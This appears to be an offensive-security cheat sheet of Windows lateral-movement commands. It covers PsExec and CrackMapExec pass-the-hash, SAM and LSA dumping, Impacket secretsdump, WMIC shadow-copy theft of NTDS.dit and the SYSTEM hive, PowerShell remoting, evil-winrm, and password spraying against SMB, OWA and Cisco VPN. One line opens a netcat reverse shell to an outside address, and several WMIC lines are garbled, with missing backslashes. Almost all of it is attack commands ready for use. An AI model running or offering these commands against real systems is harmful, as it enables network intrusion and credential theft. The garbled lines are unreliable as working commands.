### Crackmapexec
```
PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd 
psexec \\192.168.122.66 -u Administrator -p 123456Ww ipconfig
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t ipconfig 
PsExec64.exe \\ninja.corp cmd 
crackmapexec 192.168.100.1/24 
crackmapexec cme-hosts.txt --shares 
cme-hosts.txt -u username.txt -p password.txt --shares 
crackmapexec 192.168.100.10 -u Administrator -p 'Passw0rd!' -x "net users" 
crackmapexec smb 192.168.100.1/24 -u Administrator -p 'Passw0rd!' -x "net users" 
crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee  -x "hostname" 
crackmapexec smb 192.168.100.1/24 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee  -x "hostname" 
crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee --sam            
crackmapexec smb 192.168.100.10 -u Administrator -H  aad3b435b51404eeaad3b435b51404ee --lsa            
pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee //192.168.1.25 


```
### Impacket
```
psexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig 
wmiexec.py Resilient-Ninja:123456@192.168.200.1 ipconfig 
python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee Administrator@192.168.100.10 #with hash 
python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee -just-dc acmebank.loca/Administrator@192.168.100.10 

```

### Windows Management Instrumentation

```
wmic /node:DC_hostname / Domain User / password process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > vss.log“
wmic /node:DC_hostname / Domain User / password process call create "cmd /c copy GLOBALROOT Device HarddiskVolumeShadowCopy1 Windows NTDS NTDS.dit C: windows temp NTDS.dit 2>&1 > c: vss2.log“
wmic /node:DC_hostname / Domain User / password process call create "cmd /c copy GLOBALROOT Device HarddiskVolumeShadowCopy1 Windows System32 config SYSTEM C: windows temp SYSTEM.hive 2>&1 > c: vss2.log"
wmic /node:REMOTE /user:DOMAIN USER /password:PASSWORD process call create “ Windows System32 notepad.exe”

wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"F3rrari" process call create "powershell -enc [...snip...]"
WMIGrunt wkstn-4945 PowerShell cyberbotic.io\n.lamb F3rrari
WMIGrunt wkstn-4945 PowerShell

```
### Pass the Ticket with Windows Management Instrumentation
```
wmic /authority:"Kerberos: Domain DC_Hostname“ / DC_hostname process call create 
wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local path win32_process call create calc.exe
wmic /authority:"kerberos:contoso.local\district" /node:district.contoso.local "cmd /c ipconfig"
wmic /authority:"Kerberos:DOMAIN REMOTE" /node:REMOTE process call create " Windows System32 nodepad.exe"
```
  ### PowerShell Remoting
 ```
ImpersonateUser CYBER\n.lamb
MakeToken n.lamb cyberbotic.io F3rrari
PowerShell Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami }
PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("cyberbotic.io\n.lamb", $pass); Invoke-Command -ComputerName wkstn-4945 -ScriptBlock { hostname; whoami } -Credential $cred
```




### PowerShell Remoting 
```

Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}
Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}
```


### Evil-WinRM
 
```
proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
```

 ### Password Spraying Attack 
```

crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt
smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH 
crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions
spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp
spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
python atomizer.py owa contoso.com 'Fall2018' emails.txt
```
### Runas
```
runas /netonly /user:nyameeeain "C:\Windows\System32\calc.exe"
runas /netonly /user:nyameeeain powershell
runas /netonly /user:insomnia\nyameeeain "C:\Windows\System32\calc.exe"
```

